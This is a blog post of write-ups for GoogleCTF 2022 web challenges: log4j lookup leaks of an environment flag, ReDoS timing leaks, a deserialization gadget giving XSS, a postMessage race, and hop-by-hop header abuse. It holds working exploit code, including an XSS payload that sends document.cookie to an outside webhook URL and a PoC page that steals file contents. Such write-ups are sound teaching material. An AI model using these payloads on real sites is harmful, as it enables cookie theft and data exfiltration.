---
title: GoogleCTF 2022 Notes
catalog: true
date: 2022-07-09 17:36:24
tags: [Security]
categories: [Security]
photos: /img/google-ctf-2022-writeup/cover-en.png
---

<img src="/img/google-ctf-2022-writeup/cover.png" style="display:none">

This is my first time participating in GoogleCTF. I solved a web problem (HORKOS) and almost solved another one (POSTVIEWER). Here are the solutions for each web problem, sorted by the number of solves.

The keywords are as follows:

1. log4j
2. ReDoS
3. hop by hop
4. JavaScript magic function(?)
5. async/await and Promise
6. race condition

<!-- more -->

### LOG4J(105 solves)

My teammates quickly solved this problem, so I didn't look into it too much.

In short, there is a Java web service that uses log4j to print out the data you enter:

``` java
public class App {
  public static Logger LOGGER = LogManager.getLogger(App.class);
  public static void main(String[]args) {
    String flag = System.getenv("FLAG");
    if (flag == null || !flag.startsWith("CTF")) {
        LOGGER.error("{}", "Contact admin");
    }
  
    LOGGER.info("msg: {}", args);
    // TODO: implement bot commands
    String cmd = System.getProperty("cmd");
    if (cmd.equals("help")) {
      doHelp();
      return;
    }
    if (!cmd.startsWith("/")) {
      System.out.println("The command should start with a /.");
      return;
    }
    doCommand(cmd.substring(1), args);
  }
```

Although the version of log4j used in this problem is not the vulnerable version, the parameters are controllable. Therefore, let's take a look at some of the custom lookups of log4j: https://logging.apache.org/log4j/2.x/manual/lookups.html

`${env:FLAG}` represents the flag in the environment variables, and `${java:runtime}` will print out Java-related information. Combining the two becomes: `${java:${env:FLAG}}`, which will output an error message and the flag:

```
2022-07-08 01:31:16,285 main ERROR Resolver failed to lookup java:CTF{d95528534d14dc6eb6aeb81c994ce8bd} 
java.lang.IllegalArgumentException: CTF{d95528534d14dc6eb6aeb81c994ce8bd} at 
org.apache.logging.log4j.core.lookup.JavaLookup.lookup(JavaLookup.java:116) at 
org.apache.logging.log4j.core.lookup.StrLookup.evaluate(StrLookup.java:119) at 
org.apache.logging.log4j.core.lookup.Interpolator.evaluate(Interpolator.java:190) at 
org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1183) at 
org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1098) at 
org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:974) at 
org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:488) at 
.....
```

### LOG4J2 (43 solves)

Similar to the first problem, but the error message is not displayed, so other methods can be used to leak the flag.

For example, my teammates used:

1. `%replace{${env:FLAG}%repeat{x}{200000000}}{CTF.*}{y}`
2. `%replace{${env:FLAG}%repeat{x}{200000000}}{CTX.*}{y}`

Generate a long string and replace it with a replace string. Determine whether it contains a certain character based on the final time. The former takes about 4-5 seconds, and the latter takes more than 7 seconds.

You can also refer to the ReDoS constructed by [maple](https://blog.maple3142.net/2022/07/04/google-ctf-2022-writeups/#web):

```
%replace{S${env:FLAG}E}{^SCTF.a((((((((((((((((((((.)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*)*E$}{}
```

The flag can also be slowly found from the time difference.

### HORKOS (10 solves)

This is the only problem I solved by myself, and it was quite interesting.

This problem is like a shopping website. After selecting the items you want on the front end, a JSON package will be generated and sent to `/order`:

``` js
const script = new VMScript(fs.readFileSync('./shoplib.mjs').toString().replaceAll('export ','') + `
sendOrder(cart, orders)
`);

app.post('/order', recaptcha.middleware.verify, async (req,res)=>{
    req.setTimeout(1000);
    
    if (req.recaptcha.error && process.env.NODE_ENV != "dev") {
        res.writeHead(400, {'Content-Type': 'text/html'});
        return await res.end("invalid captcha");
    }

    if (!req.body.cart) {
        res.writeHead(400, {'Content-Type': 'text/html'});
        return await res.end("bad request")
    }

    // TODO: Group orders by zip code
    let orders = [];
    let cart = req.body.cart;
    let vm = new VM({sandbox: {orders, cart}});

    let result = await vm.run(script);

    orders = new Buffer.from(JSON.stringify(orders)).toString('base64');

    let url = '/order#' + orders;
    
    bot.visit(CHALL_URL + url);

    res.redirect(url);
});
```

Along the way, a sandbox is opened to run the items in `shoplib.mjs`, and finally the generated JSON is base64 encoded and sent to `/order`. Let's take a look at what `/order` does:

``` js
import * as shop from "/js/shoplib.mjs";

window.onload = () => {
    let orders = JSON.parse(atob(location.hash.substr(1)));
    console.log(orders);
    
    (orders).forEach((order) =>  {
        const client = new shop.DeliveryClient(order);
        document.all.order.innerHTML += client;
    })
} 
```

Basically, it takes the orders on the URL and calls `new shop.DeliveryClient`. The code is roughly like this:

``` js
const escapeHtml = (str) => str.includes('<') ? str.replace(/</g, c => `&#${c.charCodeAt()};`) : str;
const renderLines = (arr) => arr.reduce((p,c) => p+`
<div class="row">
<div class="col-xl-8">
  <p>${escapeHtml(c.key).toString()}</p>
</div>
<div class="col-xl-2">
  <p class="float-end">${escapeHtml(getValue(c.value, 'quantity').toString())}
  </p>
</div>
<div class="col-xl-2">
  <p class="float-end">${escapeHtml(getValue(c.value, 'price').toString())}
  </p>
</div>
<hr>
</div>`, '');

const getValue = (a, p) => p.split('/').reduce((arr,k) => arr.filter(e=>e.key==k)[0].value, a);

const renderOrder = (arr) => {
    return `
    <div class="container">
      <p class="my-5 mx-5" style="font-size: 30px;">Delivery Information</p>
      <div class="row">
        <ul class="list-unstyled">
          <li class="text-black">${escapeHtml(getValue(arr,'cart/address/street').toString())} ${escapeHtml(getValue(arr,'cart/address/number').toString())}</li>
          <li class="text-muted mt-1"><span class="text-black">Invoice</span> #${escapeHtml(getValue(arr, 'orderId').toString())}</li>
          <li class="text-black mt-1">${new Date().toDateString()}</li>
        </ul>
        <hr>
      </div>
      
      ${renderLines(getValue(arr, 'cart/items'))}

      <div class="row text-black">
        <div class="col-xl-12">
          <p class="float-end fw-bold">Total: $1337
          </p>
        </div>
        <hr style="border: 2px solid black;">
      </div>
      <div class="text-center" style="margin-top: 90px;">
        <p>Delivered by ${escapeHtml(getValue(arr, 'driver/username').toString())}. </p>
      </div>

    </div>
`;    
};

export class DeliveryClient {
    constructor(pickledOrder) {
        this.pickledOrder = pickledOrder;
    }
    toString() {
        return renderOrder(this.pickledOrder);
    }
};
```

You can see that `escapeHtml` is used before the output of the items, except for this part in `renderLines`:

``` html
<div class="col-xl-8">
  <p>${escapeHtml(c.key).toString()}</p>
</div>
```

Everywhere else is `toString` and then `escapeHtml`, but here it is the opposite. What is the difference? Let's take a look at the implementation of `escapeHtml`:

```js
const escapeHtml = (str) => str.includes('<') ? str.replace(/</g, c => `&#${c.charCodeAt()};`) : str;
```

When escaping, it first checks `str.includes`, so if `str` is an array, the filter can be bypassed, achieving XSS.

Therefore, the goal of this problem is to make `c.key`, which is `item.key`, an array, so that XSS can be achieved.

To achieve this, we need to see what the server has done, because we call `sendOrder(cart, orders)` on the server, and finally generate orders. Let's take a look at how it was generated:

``` js
export const pickle = {
    PRIMITIVES: ['String', 'Number', 'Boolean'],
    loads: json => {
        const obj = {};
        for (const {key, type, value} of json) {
            if (type.match(/^pickled/)) {
                obj[key] = pickle.loads(value);
                const constructor = type.replace(/^pickled/, '');
                obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype;
            } else {
                obj[key] = new globalThis[type](value);
            }
        }
        return obj;
    },
    dumps: obj => {
        const json = [];
        for (const key in obj) {
            const value = obj[key];
            const type = value.constructor.name;
            if (typeof type !== 'string') continue;
            if (typeof value == 'object' && !pickle.PRIMITIVES.includes(type)) {
                json.push({
                    key,
                    type: 'pickled' + type,
                    value: pickle.dumps(value)
                });
            } else if (typeof value !== 'undefined') {
                json.push({
                    key,
                    type,
                    value: globalThis[type].prototype.valueOf.call(value)
                });
            }
        }
        return json;
    }
};

const DRIVERS = ['drivefast1', 'johnnywalker', 'onagbike'];

export const sendOrder = async (value, orders) => {
    const delivery = new DeliveryService(new Order(
        pickle.loads(JSON.parse(value))[0]
    ), orders);
    return delivery.sendOrder();
};

export class Driver {
    constructor(username, orders) {
        this.username = username;
        this.orders = orders;
    }
    async sendOrder(order) {
        order.driver = this;
        const pickledOrder = pickle.dumps(order);
        this.orders.push(pickledOrder);
        return true;
    }
};
export class DeliveryClient {
    constructor(pickledOrder) {
        this.pickledOrder = pickledOrder;
    }
    toString() {
        return renderOrder(this.pickledOrder);
    }
};
export class DeliveryService {
    constructor(order, orders) {
        this.order = order;
        this.orders = orders;
    }
    findDriver() {
        return new Driver(
            DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders);
    }
    async sendOrder() {
        const driver = this.findDriver();
        if (await driver.sendOrder(this.order)) {
            return this.order.orderId;
        }
    }
};
export class Order {
    constructor(cart) {
        this.cart = cart;
        this.driver = null;
        this.orderId = this.cart.shoppingCartId;
    }
};
export class ShoppingCart {
    constructor() {
        this.items = {};
        this.address = '';
        this.shoppingCartId = Math.floor(Math.random() * 1000000000000);
    }
    addItem(key, item) {
        this.items[key] = item;
    }
    removeItem(key) {
        delete this.items[key];
    }
};
export class Item {
    constructor(price) {
        this.price = price;
    }
    setQuantity(num) {
        this.quantity = num;
    }
};
export class Address {
    constructor(street, number, zip) {
        this.street = street;
        this.number = number;
        this.zip = zip;
    }
};

```

This code is actually quite long, but in simple terms, the cart passed in will look like this:

``` js
[
  {
    'key': 'cart',
    'type': 'pickledShoppingCart',
    'value': [
      {
        'key': 'items',
        'type': 'pickledObject',
        'value': [
          {
            'key': 'abc',
            'type': 'pickledItem',
            'value': [
              {
                'key': 'price',
                'type': 'Number',
                'value': 10
              },
              {
                'key': 'quantity',
                'type': 'String',
                'value': '1'
              }
            ]
          }
        ]
      },
      {
        'key': 'address',
        'type': 'pickledAddress',
        'value': [
          {
            'key': 'street',
            'type': 'String',
            'value': ''
          },
          {
            'key': 'number',
            'type': 'Number',
            'value': 0
          },
          {
            'key': 'zip',
            'type': 'Number',
            'value': 0
          }
        ]
      },
      {
        'key': 'shoppingCartId',
        'type': 'String',
        'value': 800600798186
      }
    ]
  },
  {
    'key': 'driver',
    'type': 'pickledDriver',
    'value': [
      {
        'key': 'username',
        'type': 'String',
        'value': 'johnnywalker'
      },
      {
        'key': 'orders',
        'type': 'pickledArray',
        'value': []
      }
    ]
  },
  {
    'key': 'orderId',
    'type': 'String',
    'value': 'abc123'
  }
]
```

It can be thought of as a serialized result, and on the server, `pickle.loads(JSON.parse(value))[0]` is used to restore it to various classes.

The most suspicious part of this process is actually the related functions of pickle:

``` js
export const pickle = {
  PRIMITIVES: ['String', 'Number', 'Boolean'],
  loads: json => {
    const obj = {};
    for (const {key, type, value} of json) {
      if (type.match(/^pickled/)) {
        obj[key] = pickle.loads(value);
        const constructor = type.replace(/^pickled/, '');
        obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype;
      } else {
        obj[key] = new globalThis[type](value);
      }
    }
    return obj;
  },
  dumps: obj => {
    const json = [];
    for (const key in obj) {
      const value = obj[key];
      const type = value.constructor.name;
      if (typeof type !== 'string') continue;
      if (typeof value == 'object' && !pickle.PRIMITIVES.includes(type)) {
        json.push({
          key,
          type: 'pickled' + type,
          value: pickle.dumps(value)
        });
      } else if (typeof value !== 'undefined') {
        json.push({
          key,
          type,
          value: globalThis[type].prototype.valueOf.call(value)
        });
      }
    }
    return json;
  }
};
```

What I noticed at the beginning was the section `obj[key] = new globalThis[type](value);`. If type is `Function`, we can generate a function. If we can find a way to call that function, we can execute code in the sandbox and tamper with orders and so on.

Another thing I noticed was:

``` js
obj[key] = pickle.loads(value);
const constructor = type.replace(/^pickled/, '');
obj[key].__proto__ = (globalThis[constructor]||module[constructor]).prototype;
```

The return value of `pickle.loads` here must be an object, and with that `obj[key].__proto__`, we can actually make an object's `__proto__` become a `String` or `Number` object, etc., but it doesn't seem to help.

I also tried changing the key to `__proto__`, thinking that this way we could change `obj.__proto__.__proto__`, but this error was thrown:

> `TypeError: Immutable prototype object '#<Object>' cannot have their prototype set`
    
I actually struggled with this problem for quite a while. My original thinking was that executing code might be too difficult, and maybe we could mess with `__proto__` to make the final output key an array. But then I carefully looked at the code that was finally dumped:

``` js
const json = [];
for (const key in obj) {
  const value = obj[key];
  const type = value.constructor.name;
  if (typeof type !== 'string') continue;
  if (typeof value == 'object' && !pickle.PRIMITIVES.includes(type)) {
    json.push({
      key,
      type: 'pickled' + type,
      value: pickle.dumps(value)
    });
  } else if (typeof value !== 'undefined') {
    json.push({
      key,
      type,
      value: globalThis[type].prototype.valueOf.call(value)
    });
  }
}
return json;
```

Your key is taken out from `for in`, guaranteed to be a string, so the output key here will always be a string no matter what. Therefore, if you want the key in orders to be an array, you must be able to execute code to directly manipulate orders.

At this point, I paused for a moment and returned to the essence of this problem: deserialization.

In PHP, Python, or Java, there are vulnerabilities related to deserialization that can be exploited, and the way to do it is to find some gadgets, which are combinations of magic methods. This problem should be the same.

So I looked at the code again and tried to find any implicit type conversions that could be used to construct a `toString` or `valueOf` to execute code, but I didn't find any.

Although I didn't see these things, I did find a place that I thought had a chance:

``` js
export class DeliveryService {
  constructor(order, orders) {
    this.order = order;
    this.orders = orders;
  }
  findDriver() {
    return new Driver(
      DRIVERS[Math.floor(Math.random() * DRIVERS.length)], this.orders);
  }
  async sendOrder() {
    const driver = this.findDriver();
    if (await driver.sendOrder(this.order)) {
      return this.order.orderId;
    }
  }
};
```

The key is that sendOrder and what it finally returns.

In JS, if you return a Promise in an async function, it will be resolved, as follows:

``` js
async function test() {
  const p = new Promise(resolve => {
    console.log(123)
    resolve()
  })
  return p
}

test()
```

You can see that 123 is printed to the console, and the outer call does not need to await.

Therefore, if `this.order.orderId` is a Promise, you can sneak code in the then.

Let's do an experiment right away:

``` js
async function test() {
  var obj = {
    then: function(resolve) {
      console.log(123)
      resolve()
    }
  }
  obj.__proto__ = Promise.prototype
  return obj
}

test()
```

After execution, `123` was successfully output, indicating that this idea is feasible. So, we only need to construct such a JSON to execute code in the sandbox and modify orders:

``` js
{
  "key":"shoppingCartId",
  "type":"pickledPromise",
  "value":[
    {
      "key":"then",
      "type":"Function",
      "value":"globalThis.orders.push(JSON.parse('"+payload+"'));arguments[0]();"
    }
  ]
}
```

(`arguments[0]` in the code is the `resolve` parameter, which will be stuck if not called.)

Finally, the code I used to test and generate the payload is as follows:

``` js
const {VM, VMScript} = require("vm2");
const fs = require('fs');

const script = new VMScript(fs.readFileSync('./myshoplib.mjs').toString().replaceAll('export ','') + `
sendOrder(cart, orders)
`);

async function main () {
  let orders = [];

  let payload = JSON.stringify([
    {
        'key': 'cart',
        'type': 'pickledShoppingCart',
        'value': [
            {
                'key': 'items',
                'type': 'pickledObject',
                'value': [
                    {
                        'key': ['<img src=x onerror="location=`https://webhook.site/d8dc1452-8e82-408d-9dcf-8ad713754f36/?q=${encodeURIComponent(document.cookie)}`">'],
                        'type': 'pickledItem',
                        'value': [
                            {
                                'key': 'price',
                                'type': 'Number',
                                'value': 10
                            },
                            {
                                'key': 'quantity',
                                'type': 'String',
                                'value': '1'
                            }
                        ]
                    }
                ]
            },
            {
                'key': 'address',
                'type': 'pickledAddress',
                'value': [
                    {
                        'key': 'street',
                        'type': 'String',
                        'value': ''
                    },
                    {
                        'key': 'number',
                        'type': 'Number',
                        'value': 0
                    },
                    {
                        'key': 'zip',
                        'type': 'Number',
                        'value': 0
                    }
                ]
            },
            {
                'key': 'shoppingCartId',
                'type': 'String',
                'value': 800600798186
            }
        ]
    },
    {
        'key': 'driver',
        'type': 'pickledDriver',
        'value': [
            {
                'key': 'username',
                'type': 'String',
                'value': 'johnnywalker'
            },
            {
                'key': 'orders',
                'type': 'pickledArray',
                'value': []
            }
        ]
    },
    {
        'key': 'orderId',
        'type': 'String',
        'value': 'PEW'
    }
]).replaceAll('"', '\\"')
  
  let cart = JSON.stringify(
    [{"key":"0","type":"pickledShoppingCart","value":[{"key":"items","type":"pickledObject","value":[{"key":"Tomato","type":"pickledItem","value":[{"key":"price","type":"Number","value":10},{"key":"quantity","type":"String","value":"1"}]},{"key":"Pickle","type":"pickledItem","value":[{"key":"price","type":"Number","value":8},{"key":"quantity","type":"String","value":"0"}]},{"key":"Pineapple","type":"pickledItem","value":[{"key":"price","type":"Number","value":44},{"key":"quantity","type":"String","value":"0"}]}]},{"key":"address","type":"pickledAddress","value":[{"key":"street","type":"String","value":"1"},{"key":"number","type":"Number","value":0},{"key":"zip","type":"Number","value":0}]},{"key":"shoppingCartId","type":"pickledPromise","value":[{"key":"then","type":"Function","value":"globalThis.orders.push(JSON.parse('"+payload+"'));arguments[0]();"}]}]}]
  );


  let vm = new VM({sandbox: {orders, cart, console}});
  console.log('before')
  try {
    let result = await vm.run(script);
  } catch(err){
    console.log('err', err)
  }
  console.log('after')
  console.log('orders')
  console.log(orders)

  console.log(encodeURIComponent(cart))

  //console.log(orders[0][0].value[0])
}
main()
```

### POSTVIEWER (10 solves)

The core code of this problem is directly attached below:

``` html
const SHIM = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>SHIM</title>
</head>
<body>
    <script>
        onmessage = (e) => {
            if (e.data.body === undefined || !e.data.mimeType) {
                return;
            };
            const blob = new Blob([e.data.body], {
                type: e.data.mimeType
            });
            onunload = () => e.source.postMessage("blob loaded", "*");
            location = URL.createObjectURL(blob);
        };
    <\\/script>
</body>
</html>`
const SHIM_DATA_URL = `data:text/html,<script>
    location=URL.createObjectURL(new Blob([\`${SHIM}\`], {type:"text/html"}))
</script>`;
async function previewIframe(container, body, mimeType) {
    var iframe = document.createElement('iframe');
    iframe.src = SHIM_DATA_URL;
    container.appendChild(iframe);
    iframe.addEventListener('load', () => {
        iframe.contentWindow?.postMessage({ body, mimeType }, '*');
    }, { once: true });
}
```

When you call `previewIframe`, an iframe is first generated, and then the HTML inside is generated in another HTML using `location=URL.createObjectURL`, and `onmessage` is used to listen for messages. After the iframe is successfully loaded, `postMessage` is used to send the content to be displayed.

However, there is a race condition problem with this approach. If we keep sending `postMessage` to the iframe, we can render the content we need before the iframe's `onload` event is triggered, allowing us to control the content inside the iframe.

The ideal process for this problem is as follows:

1. `previewIframe` is called.
2. An iframe is created and SHIM is loaded.
3. SHIM is loaded successfully and starts listening for messages.
4. Our `postMessage` is successful and our content starts loading.
5. Our content is loaded successfully.
6. The `onload` event of the iframe is triggered, and `iframe.contentWindow?.postMessage` is executed.
7. Our HTML receives the file content and successfully steals the file.

When I was solving this problem, I encountered a problem with the order of steps 5 and 6. No matter what I tried, I could only achieve: "Our content is indeed loaded, but we missed the outer `postMessage`."

Initially, my idea was to send messages aggressively to win the race condition, like this:

``` js
function send() {
  w[0]?.postMessage({
    body: 'test',
    mimeType: 'text/html'
  }, '*')
  setTimeout(send, 0)
}
send()
```

However, I found that even XSS could not be triggered in this way, but changing the timeout to a larger value, such as 20, could.

Later, I did some experiments and realized why this couldn't be done. It's because of this part:

``` js
onmessage = (e) => {
    if (e.data.body === undefined || !e.data.mimeType) {
        return;
    };
    const blob = new Blob([e.data.body], {
        type: e.data.mimeType
    });
    onunload = () => e.source.postMessage("blob loaded", "*");
    location = URL.createObjectURL(blob);
};
```

Note that after `location = URL.createObjectURL(blob)` is executed, the location will not switch immediately. Therefore, if we keep sending messages, `onmessage` will keep triggering, and the `location` line will keep being triggered. The previous location has not finished loading, and a new one is assigned, becoming an infinite loop.

The reason why increasing the timeout works is that if the location loading time is less than 20ms, the page will be switched when the new message is sent, so XSS can be successfully triggered.

Also, I did an experiment and found that the loading of `location` is unrelated to the UI thread, that is:

``` js
location = '//example.com'
while(1){}
```

This code will still successfully switch pages without any problems.

The most difficult part of this problem is determining the timing of sending messages. Why do we have to keep sending messages? Because we don't know exactly when to send them, so we have to keep trying. We can wait for the iframe to be ready before sending messages, but at that time, the iframe has not loaded SHIM, so sending messages is useless. So how do we know when SHIM has loaded successfully? We don't know, so it's complicated.

Later, I continued to experiment and found that we can delay the main thread by constantly changing the hash or using a very time-consuming selector, but we still cannot control the order, and in the end, I couldn't solve it.

The official solution is here: https://gist.github.com/terjanq/7c1a71b83db5e02253c218765f96a710

After reading it, I realized that I had the order wrong.

I was always thinking about delaying the main thread, but because the main page and the iframe are different processes, we only need to detect when the iframe is loaded successfully, and then find a way to delay the main thread. At this time, the iframe is still loading SHIM, but `onload` is temporarily blocked and will not be triggered.

At this point, we only need to wait for a period of time (the official solution is 500ms) before sending `postMessage`. At that time, SHIM has been loaded, and although the main thread is still blocked, the iframe is still loading.

In this way, when the main thread is free to do something, our iframe has already been loaded, and we can get the data.

### GPUSHOP2 (7 solves)

This problem was modified from last year's version, and the solution from last year can be found here: https://github.com/ComdeyOverFlow/Google_CTF_2021/blob/main/gpushop.md

I didn't look at it very carefully, but it should be caused by URL encoding a certain path, which leads to the proxy not matching the path.

This year's version fixed last year's problem by always adding an `X-Wallet: EMPTY` header, so last year's solution cannot be used.

The final solution is hop-by-hop headers. What is that?

HTTP request headers can be divided into two types:

1. End-to-end
2. Hop-by-hop

Because when you send an HTTP request, it may go through a proxy, right? Hop-by-hop headers are headers that are intended for the proxy. The proxy will process them and may not forward them to the next server after processing.

The following are all hop-by-hop headers:

1. Connection
2. Keep-Alive
3. Proxy-Authenticate
4. Proxy-Authorization
5. TE
6. Trailers
7. Transfer-Encoding
8. Upgrade

In addition, according to the spec, headers placed in `Connection` should also be treated as hop-by-hop. For example:

```
Connection: close, X-Foo, X-Bar
```

This tells the proxy to treat X-Foo and X-Bar as hop-by-hop headers and remove them, not to send them to the next proxy.

Therefore, for this question, we can use this feature to remove `X-Wallet`:

```
Connection: X-Wallet
```

For more related research, please refer to this article: https://nathandavison.com/blog/abusing-http-hop-by-hop-request-headers

## POSTVIEWER Script Backup

Here is the official answer script backup. It seems to use postMessage + onmessage to achieve the effect of an asynchronous infinite loop, which is quite interesting.

``` html
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <title>POC Vulnerable website</title>
</head>
<body>
    <h1>Click me!</h1>
    <iframe style="width:1px;height:1px" name="loop"></iframe>
    <pre id="log"></pre>
    <script>
        const URL = 'https://postviewer-web.2022.ctfcompetition.com';
        const sleep = (d) => new Promise((r) => setTimeout(r, d));
        function notify(...args){
            navigator.sendBeacon('', args);
            console.log(...args);
        }
        async function load(win, url) {
            const buffer = new Uint8Array(1e7);
            win.location = 'about:blank';
            await new Promise((resolve) => {
                loop.onmessage = () => {
                    try {
                        win.origin;
                        resolve();
                    } catch (e) {
                        loop.postMessage(null);
                    }
                };
                loop.postMessage(null);
            });
            win.location = url;
            await new Promise((resolve) => {
                loop.onmessage = () => {
                    if (win.length === 1) {
                        // Send a huge message so e.data.toString() blocks a thread for a while
                        // By transfering only a reference to memory chunk, sending the message
                        // will be fast enough to race condition window.onmessage and iframe.onload
                        // notify(Date.now(), '==1');
                        win?.postMessage(buffer, '*', [buffer.buffer]);
                        // Once we know the innerIframe loaded, we can now postMessage to it
                        // because it will be rendered in a different process in Chrome, so
                        // the blocked parent thread won't affect rendering the iframe!
                        setTimeout(() => {
                            win[0]?.postMessage(
                                {
                                    body: `LOL! <script>onmessage=async (e)=>{
                      let text = await e.data.body.text();
                      parent.opener.postMessage({stolen: text}, '*');
                    }<\/script>`,
                                    mimeType: "text/html",
                                },
                                "*"
                            );
                            resolve();
                        }, 500);
                    } else {
                        loop.postMessage(null);
                    }
                };
                loop.postMessage(null);
            });
            return 1;
        }
        var TIMEOUT = 1500;
        var win;
        function waitForMessage(url) {
            return new Promise(async resolve => {
                onmessage = e => {
                    if (e.data.stolen) {
                        notify(e.data.stolen);
                        log.innerText += e.data.stolen + '\n';
                        resolve(false);
                    }
                }
                const rnd = 'a' + Math.random().toString(16).slice(2);
                const _url = url + ',' + rnd;
                await load(win, _url);
                setTimeout(() => {
                    resolve(true);
                }, TIMEOUT);
            });
        }
        onload = onclick = async () => {
            if (!win || win.closed) {
                win = open('about:blank', 'hack', 'width=800,height=300,top=500');
            }
            for (let i = 1; i < 100; i++) {
                const url = `${URL}/#a,.list-group-item:nth-child(${i})`;
                while (await waitForMessage(url));
            }
        };
    </script>
</body>
</html>
```
